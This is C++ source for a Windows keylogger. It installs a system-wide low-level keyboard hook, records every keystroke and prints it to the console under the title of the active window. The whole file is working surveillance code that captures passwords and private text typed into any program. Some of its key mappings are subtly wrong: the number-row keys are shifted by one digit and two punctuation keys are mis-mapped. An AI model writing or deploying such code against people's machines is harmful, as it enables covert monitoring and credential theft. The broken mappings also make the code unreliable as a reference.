
#include <iostream>
#include <Windows.h>


HANDLE gFiniEvent;

char windowText[1024];
HHOOK hhkLowLevelKbd;

HWND lastWindow = NULL;

std::string GetStringRepr(DWORD code, BOOL caps, BOOL shift) {

		std::string key;

		if (code >= 0x41 && code <= 0x5A) {

			if (caps) {
				if (shift)
					return std::string(1, tolower(code));
				else
					return std::string(1, toupper(code));
			}
			else {
				if (shift)
					return std::string(1, toupper(code));
				else
					return std::string(1, tolower(code));
			}
		}

		switch (code)
		{
		case VK_NUMPAD0:  key = "0"; break;
		case VK_NUMPAD1:  key = "1"; break;
		case VK_NUMPAD2: key = "2"; break;
		case VK_NUMPAD3:  key = "3"; break;
		case VK_NUMPAD4:  key = "4"; break;
		case VK_NUMPAD5:  key = "5"; break;
		case VK_NUMPAD6:  key = "6"; break;
		case VK_NUMPAD7:  key = "7"; break;
		case VK_NUMPAD8:  key = "8"; break;
		case VK_NUMPAD9:  key = "9"; break;
		case VK_MULTIPLY: key = "*"; break;
		case VK_ADD:      key = "+"; break;
		case VK_SEPARATOR: key = "-"; break;
		case VK_SUBTRACT: key = "-"; break;
		case VK_DECIMAL:  key = "."; break;
		case VK_DIVIDE:   key = "/"; break;

		case VK_F1:  key = "[F1]"; break;
		case VK_F2:  key = "[F2]"; break;
		case VK_F3:  key = "[F3]"; break;
		case VK_F4:  key = "[F4]"; break;
		case VK_F5:  key = "[F5]"; break;
		case VK_F6:  key = "[F6]"; break;
		case VK_F7:  key = "[F7]"; break;
		case VK_F8:  key = "[F8]"; break;
		case VK_F9:  key = "[F9]"; break;
		case VK_F10:  key = "[F10]"; break;
		case VK_F11:  key = "[F11]"; break;
		case VK_F12:  key = "[F12]"; break;

		case VK_NUMLOCK: key = "[NUM-LOCK]"; break;
		case VK_SCROLL:  key = "[SCROLL-LOCK]"; break;
		case VK_BACK:    key = "[BACK]"; break;
		case VK_TAB:     key = "[TAB]"; break;
		case VK_CLEAR:   key = "[CLEAR]"; break;
		case VK_RETURN:  key = "[ENTER]"; break;
		case VK_SHIFT:   key = "[SHIFT]"; break;
		case VK_CONTROL: key = "[CTRL]"; break;
		case VK_MENU:    key = "[ALT]"; break;
		case VK_PAUSE:   key = "[PAUSE]"; break;
		case VK_CAPITAL: key = "[CAP-LOCK]"; break;
		case VK_ESCAPE:  key = "[ESC]"; break;
		case VK_SPACE:   key = "[SPACE]"; break;
		case VK_PRIOR:   key = "[PAGEUP]"; break;
		case VK_NEXT:    key = "[PAGEDOWN]"; break;
		case VK_END:     key = "[END]"; break;
		case VK_HOME:    key = "[HOME]"; break;
		case VK_LEFT:    key = "[LEFT]"; break;
		case VK_UP:      key = "[UP]"; break;
		case VK_RIGHT:   key = "[RIGHT]"; break;
		case VK_DOWN:    key = "[DOWN]"; break;
		case VK_SELECT:  key = "[SELECT]"; break;
		case VK_PRINT:   key = "[PRINT]"; break;
		case VK_SNAPSHOT: key = "[PRTSCRN]"; break;
		case VK_INSERT:  key = "[INS]"; break;
		case VK_DELETE:  key = "[DEL]"; break;
		case VK_HELP:    key = "[HELP]"; break;

		case 0x30:  key = shift ? "!" : "1"; break;
		case 0x31:  key = shift ? "@" : "2"; break;
		case 0x32:  key = shift ? "#" : "3"; break;
		case 0x33:  key = shift ? "$" : "4"; break;
		case 0x34:  key = shift ? "%" : "5"; break;
		case 0x35:  key = shift ? "^" : "6"; break;
		case 0x36:  key = shift ? "&" : "7"; break;
		case 0x37:  key = shift ? "*" : "8"; break;
		case 0x38:  key = shift ? "(" : "9"; break;
		case 0x39:  key = shift ? ")" : "0"; break;

		case VK_LWIN:     key = "[WIN]"; break;
		case VK_RWIN:     key = "[WIN]"; break;
		case VK_LSHIFT:   key = "[SHIFT]"; break;
		case VK_RSHIFT:   key = "[SHIFT]"; break;
		case VK_LCONTROL: key = "[CTRL]"; break;
		case VK_RCONTROL: key = "[CTRL]"; break;

		case VK_OEM_1:      key = shift ? ":" : ";"; break;
		case VK_OEM_PLUS:   key = shift ? "+" : "="; break;
		case VK_OEM_COMMA:  key = shift ? "<" : ","; break;
		case VK_OEM_MINUS:  key = shift ? "_" : "-"; break;
		case VK_OEM_PERIOD: key = shift ? ">" : "."; break;
		case VK_OEM_2:      key = shift ? "?" : "/"; break;
		case VK_OEM_3:      key = shift ? "~" : "`"; break;
		case VK_OEM_4:      key = shift ? "{" : "["; break;
		case VK_OEM_5:      key = shift ? "\\" : "|"; break;
		case VK_OEM_6:      key = shift ? "}" : "]"; break;
		case VK_OEM_7:      key = shift ? "'" : "'"; break;

		default: key = "[UNK]"; break;
		}
		return key;

	}

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION) {
        KBDLLHOOKSTRUCT* key = (KBDLLHOOKSTRUCT*)lParam;
		

		bool shift = GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_LSHIFT) & 0x8000 || GetKeyState(VK_RSHIFT) & 0x8000,
			 caps = GetKeyState(VK_CAPITAL) > 0;

		if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
		{
			HWND currentWindow = GetForegroundWindow();

			if (currentWindow != lastWindow) {
				GetWindowTextA(GetForegroundWindow(), windowText, sizeof(windowText));
			
				std::cout << "\n\n[" << windowText << "] :" << std::endl;
				lastWindow = currentWindow;
			}

			if (key->vkCode)
			{
				std::cout << GetStringRepr(key->vkCode, caps, shift);
			}
		}
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}

BOOL WINAPI ExitSignalHandler(_In_ DWORD dwCtrlType) {
    if (dwCtrlType == CTRL_C_EVENT) {
        SetEvent(gFiniEvent);
        return TRUE;
    }

    return FALSE;
}

void InitializeGlobals() {
    gFiniEvent = CreateEvent(
        NULL,
        TRUE,
        FALSE,
        TEXT("FinishEvent")
    );

    if (gFiniEvent == NULL) {
        printf("CreateEvent failed: (%d)\n", GetLastError());
        return;
    }

    if (SetConsoleCtrlHandler(ExitSignalHandler, TRUE) == NULL) {
        printf("SetConsoleCtrlHandler failed: (%d)\n", GetLastError());
        return;
    }
}

void WndProc() {
	hhkLowLevelKbd = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), NULL);

	if (hhkLowLevelKbd == NULL) {
		printf("SetWindowsHookEx failed: (%d)\n", GetLastError());
		return;
	}

	MSG msg;

	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}

int main(int argc, char* argv[])
{
    printf("Exit program via CTRL-C\n");

    InitializeGlobals();

	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)WndProc, NULL, 0, NULL);

	WaitForSingleObject(gFiniEvent, INFINITE);

    // cleanup
	CloseHandle(hThread);
    CloseHandle(gFiniEvent);

    // remove hook
    UnhookWindowsHookEx(hhkLowLevelKbd);

    return 0;
}
